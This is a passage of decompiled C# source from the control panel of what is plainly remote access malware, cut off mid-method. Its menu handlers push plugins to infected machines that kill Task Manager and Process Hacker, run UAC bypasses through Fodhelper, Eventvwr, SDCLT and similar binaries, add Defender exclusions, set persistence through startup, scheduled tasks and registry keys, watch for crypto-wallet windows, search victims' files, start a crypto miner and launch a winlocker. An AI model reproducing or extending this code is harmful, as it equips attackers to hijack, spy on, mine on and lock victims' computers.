			byte[] array = LEB128.Write(new object[]
			{
				"Updates-"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Windows_Update_Disable"
			});
		}

		// Token: 0x0600016D RID: 365 RVA: 0x00010494 File Offset: 0x0000E694
		private void noteToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (Clients clients in this.ClientsSelected())
			{
				FormInput formInput = new FormInput();
				formInput.Text = "Note";
				formInput.rjTextBox1.PlaceholderText = "Note...";
				formInput.ShowDialog();
				if (formInput.Run)
				{
					File.WriteAllText("Users\\" + clients.Hwid + "\\Note.txt", formInput.rjTextBox1.Texts);
					((DataGridViewRow)clients.Tag).Cells[4].Value = formInput.rjTextBox1.Texts;
				}
			}
		}

		// Token: 0x0600016E RID: 366 RVA: 0x00010550 File Offset: 0x0000E750
		private void performanceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Performance.dll");
			Clients[] array = this.ClientsSelected();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				if ((FormPerformance)Application.OpenForms["Performance:" + clients.Hwid] == null)
				{
					new FormPerformance
					{
						Name = "Performance:" + clients.Hwid,
						parrent = clients
					}.Show();
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x0600016F RID: 367 RVA: 0x00010620 File Offset: 0x0000E820
		private void killToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Kill processes";
			formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
			formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] pack = LEB128.Write(new object[]
				{
					true,
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
				Clients[] array2 = this.ClientsSelected();
				for (int i = 0; i < array2.Length; i++)
				{
					Clients clients = array2[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x00010744 File Offset: 0x0000E944
		private void deadToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Dead processes";
			formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
			formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] pack = LEB128.Write(new object[]
				{
					false,
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
				Clients[] array2 = this.ClientsSelected();
				for (int i = 0; i < array2.Length; i++)
				{
					Clients clients = array2[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000171 RID: 369 RVA: 0x00010868 File Offset: 0x0000EA68
		private void toolStripMenuItem84_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Kill processes";
			formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
			formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] array2 = LEB128.Write(new object[]
				{
					true,
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						array2
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_AntiProcess_Kill"
				});
			}
		}

		// Token: 0x06000172 RID: 370 RVA: 0x00010984 File Offset: 0x0000EB84
		private void toolStripMenuItem85_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Dead processes";
			formInput.rjTextBox1.PlaceholderText = "Process.exe,Process1.exe";
			formInput.rjTextBox1.Texts = "Taskmgr.exe,ProcessHacker.exe,procexp.exe";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] array2 = LEB128.Write(new object[]
				{
					true,
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\AntiProcess.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						array2
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_AntiProcess_Dead"
				});
			}
		}

		// Token: 0x06000173 RID: 371 RVA: 0x00010AA0 File Offset: 0x0000ECA0
		private void windowsExceToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Exclusion"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000174 RID: 372 RVA: 0x00010B2C File Offset: 0x0000ED2C
		private void toolStripMenuItem87_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"runas"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Runas"
			});
		}

		// Token: 0x06000175 RID: 373 RVA: 0x00010BB0 File Offset: 0x0000EDB0
		private void toolStripMenuItem88_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"runassystem"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_RunSys"
			});
		}

		// Token: 0x06000176 RID: 374 RVA: 0x00010C34 File Offset: 0x0000EE34
		private void toolStripMenuItem89_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Eventvwr"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Eventvwr"
			});
		}

		// Token: 0x06000177 RID: 375 RVA: 0x00010CB8 File Offset: 0x0000EEB8
		private void toolStripMenuItem90_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Fodhelper"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Fodhelper"
			});
		}

		// Token: 0x06000178 RID: 376 RVA: 0x00010D3C File Offset: 0x0000EF3C
		private void toolStripMenuItem91_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Computerdefaults"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_Computerdefaults"
			});
		}

		// Token: 0x06000179 RID: 377 RVA: 0x00010DC0 File Offset: 0x0000EFC0
		private void toolStripMenuItem92_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"SDCLT"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_SDCLT"
			});
		}

		// Token: 0x0600017A RID: 378 RVA: 0x00010E44 File Offset: 0x0000F044
		private void toolStripMenuItem93_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"SLUI"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_SLUI"
			});
		}

		// Token: 0x0600017B RID: 379 RVA: 0x00010EC8 File Offset: 0x0000F0C8
		private void toolStripMenuItem94_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\UAC.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"DiskCleanup"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Uac_DiskCleanup"
			});
		}

		// Token: 0x0600017C RID: 380 RVA: 0x00010F4C File Offset: 0x0000F14C
		private void toolStripMenuItem97_Click(object sender, EventArgs e)
		{
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Exit"
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Client_Exit"
			});
		}

		// Token: 0x0600017D RID: 381 RVA: 0x00010FA8 File Offset: 0x0000F1A8
		private void toolStripMenuItem98_Click(object sender, EventArgs e)
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Filter = "Executable (*.exe)|*.exe";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					byte[] array = File.ReadAllBytes(openFileDialog.FileName);
					AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
					{
						task = new object[]
						{
							"Update",
							array
						},
						Runs = 0L,
						TasksRunsed = new List<string>(),
						RunOnce = true,
						Name = Randomizer.getRandomCharactersAscii() + "_Client_Update"
					});
				}
			}
		}

		// Token: 0x0600017E RID: 382 RVA: 0x0001104C File Offset: 0x0000F24C
		private void toolStripMenuItem99_Click(object sender, EventArgs e)
		{
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Restart"
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Client_Restart"
			});
		}

		// Token: 0x0600017F RID: 383 RVA: 0x000110A8 File Offset: 0x0000F2A8
		private void toolStripMenuItem100_Click(object sender, EventArgs e)
		{
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Uninstall"
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Client_Uninstall"
			});
		}

		// Token: 0x06000180 RID: 384 RVA: 0x00011104 File Offset: 0x0000F304
		private void toolStripMenuItem103_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] array = LEB128.Write(new object[]
			{
				"Shutdown"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_System_Shutdown"
			});
		}

		// Token: 0x06000181 RID: 385 RVA: 0x0001119C File Offset: 0x0000F39C
		private void toolStripMenuItem104_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] array = LEB128.Write(new object[]
			{
				"Restart"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_System_Restart"
			});
		}

		// Token: 0x06000182 RID: 386 RVA: 0x00011234 File Offset: 0x0000F434
		private void toolStripMenuItem105_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			byte[] array = LEB128.Write(new object[]
			{
				"Logoff"
			});
			string checksum = Methods.GetChecksum("Plugin\\SysPlug.dll");
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_System_Logoff"
			});
		}

		// Token: 0x06000183 RID: 387 RVA: 0x000112CC File Offset: 0x0000F4CC
		private void toolStripMenuItem101_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Exclusion"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Exclusion"
			});
		}

		// Token: 0x06000184 RID: 388 RVA: 0x00011350 File Offset: 0x0000F550
		private void startupToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Startup"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000185 RID: 389 RVA: 0x000113DC File Offset: 0x0000F5DC
		private void toolStripMenuItem106_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"Schtask"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000186 RID: 390 RVA: 0x00011468 File Offset: 0x0000F668
		private void schtaskToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"SchtaskHighest"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000187 RID: 391 RVA: 0x000114F4 File Offset: 0x0000F6F4
		private void regUserToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"RegUser"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000188 RID: 392 RVA: 0x00011580 File Offset: 0x0000F780
		private void regMachineToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"RegMachine"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000189 RID: 393 RVA: 0x0001160C File Offset: 0x0000F80C
		private void regUserinitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"RegUserinit"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x0600018A RID: 394 RVA: 0x00011698 File Offset: 0x0000F898
		private void toolStripMenuItem108_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Startup"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Startup"
			});
		}

		// Token: 0x0600018B RID: 395 RVA: 0x0001171C File Offset: 0x0000F91C
		private void toolStripMenuItem109_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"Schtask"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Schtask"
			});
		}

		// Token: 0x0600018C RID: 396 RVA: 0x000117A0 File Offset: 0x0000F9A0
		private void toolStripMenuItem110_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"SchtaskHighest"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Highest"
			});
		}

		// Token: 0x0600018D RID: 397 RVA: 0x00011824 File Offset: 0x0000FA24
		private void toolStripMenuItem111_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"RegUser"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_User"
			});
		}

		// Token: 0x0600018E RID: 398 RVA: 0x000118A8 File Offset: 0x0000FAA8
		private void toolStripMenuItem112_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"RegMachine"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Machine"
			});
		}

		// Token: 0x0600018F RID: 399 RVA: 0x0001192C File Offset: 0x0000FB2C
		private void toolStripMenuItem113_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"RegUserinit"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_AutoRun_Userinit"
			});
		}

		// Token: 0x06000190 RID: 400 RVA: 0x000119B0 File Offset: 0x0000FBB0
		private void setCriticalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"CriticalSet"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Critical_Set"
			});
		}

		// Token: 0x06000191 RID: 401 RVA: 0x00011A34 File Offset: 0x0000FC34
		private void exitCriticalToolStripMenuItem_Click(object sender, EventArgs e)
		{
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] array = LEB128.Write(new object[]
			{
				"CriticalExit"
			});
			AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
			{
				task = new object[]
				{
					"Invoke",
					checksum,
					array
				},
				Runs = 0L,
				TasksRunsed = new List<string>(),
				RunOnce = true,
				Name = Randomizer.getRandomCharactersAscii() + "_Critical_Exit"
			});
		}

		// Token: 0x06000192 RID: 402 RVA: 0x00011AB8 File Offset: 0x0000FCB8
		private void toolStripMenuItem115_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"CriticalSet"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000193 RID: 403 RVA: 0x00011B44 File Offset: 0x0000FD44
		private void toolStripMenuItem116_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			string checksum = Methods.GetChecksum("Plugin\\Action.dll");
			byte[] pack = LEB128.Write(new object[]
			{
				"CriticalExit"
			});
			Clients[] array = this.ClientsAll();
			for (int i = 0; i < array.Length; i++)
			{
				Clients clients = array[i];
				System.Threading.Tasks.Task.Run(delegate()
				{
					clients.Send(new object[]
					{
						"Invoke",
						checksum,
						pack
					});
				});
			}
		}

		// Token: 0x06000194 RID: 404 RVA: 0x00011BD0 File Offset: 0x0000FDD0
		private void startToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "Window";
			formInput.rjTextBox1.PlaceholderText = "Window1,Window2";
			formInput.rjTextBox1.Texts = "Crypto,Bitcoin,Metamask";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] pack = LEB128.Write(new object[]
				{
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\ReportWindow.dll");
				Clients[] array2 = this.ClientsSelected();
				for (int i = 0; i < array2.Length; i++)
				{
					Clients clients = array2[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000195 RID: 405 RVA: 0x00011CE8 File Offset: 0x0000FEE8
		private void stopToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			foreach (Clients clients in this.ClientsSelected())
			{
				if (clients.ReportWindow != null)
				{
					clients.ReportWindow.Disconnect();
					clients.ReportWindow = null;
				}
			}
		}

		// Token: 0x06000196 RID: 406 RVA: 0x00011D3C File Offset: 0x0000FF3C
		private void toolStripMenuItem117_Click(object sender, EventArgs e)
		{
			FormInput formInput = new FormInput();
			formInput.Text = "Window";
			formInput.rjTextBox1.PlaceholderText = "Window1,Window2";
			formInput.rjTextBox1.Texts = "Crypto,Bitcoin,Metamask";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] array2 = LEB128.Write(new object[]
				{
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\ReportWindow.dll");
				AutoTaskMgr.AppendTask(new Server.Helper.Tasks.Task
				{
					task = new object[]
					{
						"Invoke",
						checksum,
						array2
					},
					Runs = 0L,
					TasksRunsed = new List<string>(),
					RunOnce = true,
					Name = Randomizer.getRandomCharactersAscii() + "_ReportWindow"
				});
			}
		}

		// Token: 0x06000197 RID: 407 RVA: 0x00011E50 File Offset: 0x00010050
		private void fileSearcherToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			FormInput formInput = new FormInput();
			formInput.Text = "File Searcher";
			formInput.rjTextBox1.PlaceholderText = ".png,.exe";
			formInput.rjTextBox1.Texts = ".txt,.pdf,.png";
			formInput.ShowDialog();
			if (formInput.Run)
			{
				List<object> list = new List<object>();
				foreach (string item in formInput.rjTextBox1.Texts.Split(new char[]
				{
					','
				}))
				{
					list.Add(item);
				}
				byte[] pack = LEB128.Write(new object[]
				{
					list.ToArray()
				});
				string checksum = Methods.GetChecksum("Plugin\\FileSearcher.dll");
				Clients[] array2 = this.ClientsSelected();
				for (int i = 0; i < array2.Length; i++)
				{
					Clients clients = array2[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							pack
						});
					});
				}
			}
		}

		// Token: 0x06000198 RID: 408 RVA: 0x00011F68 File Offset: 0x00010168
		private void minerRigelToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (!this.MinerEtc.Visible && this.MinerEtc.work)
			{
				this.MinerEtc.Show();
			}
			if (!this.MinerEtc.work)
			{
				this.MinerEtc.Show();
				this.MinerEtc.work = true;
				string checksum = Methods.GetChecksum("Plugin\\MinerEtc.dll");
				Clients[] array = this.ClientsAll();
				for (int i = 0; i < array.Length; i++)
				{
					Clients clients = array[i];
					System.Threading.Tasks.Task.Run(delegate()
					{
						clients.Send(new object[]
						{
							"Invoke",
							checksum,
							new byte[1]
						});
					});
				}
			}
		}

		// Token: 0x06000199 RID: 409 RVA: 0x0001200F File Offset: 0x0001020F
		private void copyRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			Thread thread = new Thread(delegate()
			{
				try
				{
					string path = Path.Combine(new FileInfo(Application.ExecutablePath).Directory.FullName, "Users");
					StringCollection stringCollection = new StringCollection();
					foreach (Clients clients in this.ClientsSelected())
					{
						stringCollection.Add(Path.Combine(path, clients.Hwid));
					}
					Clipboard.SetFileDropList(stringCollection);
				}
				catch
				{
				}
			});
			thread.SetApartmentState(ApartmentState.STA);
			thread.Start();
			thread.Join();
		}

		// Token: 0x0600019A RID: 410 RVA: 0x00012047 File Offset: 0x00010247
		private void winlockerToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (this.GridClients.SelectedRows.Count == 0)
			{
				return;
			}
			new FormWinlocker
			{
